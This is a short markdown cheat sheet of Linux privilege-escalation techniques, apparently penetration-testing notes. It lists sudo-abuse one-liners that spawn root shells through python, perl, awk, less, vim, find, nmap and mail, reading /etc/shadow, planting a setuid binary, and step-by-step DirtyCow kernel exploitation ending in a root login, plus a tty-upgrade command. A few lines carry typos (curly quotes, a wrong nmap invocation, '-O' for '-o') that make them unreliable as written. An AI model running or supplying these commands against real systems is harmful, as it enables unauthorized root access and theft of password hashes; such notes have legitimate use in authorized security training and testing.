# Linux Privesc

## Sudoers - Privesc

#### Exhaustive list
https://gtfobins.github.io/

```
➤ Python
sudo -u root /usr/bin/python
>>> from subprocess import call
>>> call(['/bin/bash'])

➤ Perl
sudo -u root /usr/bin/perl -e ‘`/bin/bash`’

➤ CP + Chmod
sudo -u root /bin/cp exploit exploit
sudo -u root /bin/chmod +xs exploit
./exploit

➤ Awk
awk 'BEGIN {system("/bin/bash")}'

➤ Less
• Solution 1 - read a file
sudo -u root /usr/bin/less /etc/shadow
 
• Solution 2 - create a file
sudo -u root /usr/bin/less 
then insert the following command :
!/bin/bash

➤ Vim
sudo -u victim /usr/bin/vim
then write the following command (same way to quit vim :!q):
:!/bin/bash

➤ Find
sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;

➤ Bash
sudo -u root /bin/bash

➤ Nmap
sudo -u nmap –interactive
nmap>!bash
or
nmap>!sh

➤ Mail
sudo mail --exec='!/bin/bash'
```

## Crontab - Privesc

## DirtyCow

Exploit: Linux Kernel 2.6.22 > 3.9

• https://dirtycow.ninja/

• https://github.com/FireFart/dirtycow/blob/master/dirty.c


```
➤ 1. Upload the exploit on the victim

➤ 2. Compile the exploit
gcc -pthread dirty.c -O dirty -lcrypt
chmod +x dirty

➤ 3. exploit it
./dirty
Please enter the new password: lexiswashere

➤ 4. Privesc
su firefart
Password: lexiswashere

Note: if the 'su : must be run from a terminal' error appear, upgrade tty 
python -c 'import pty; pty.spawn("/bin/sh")'
```
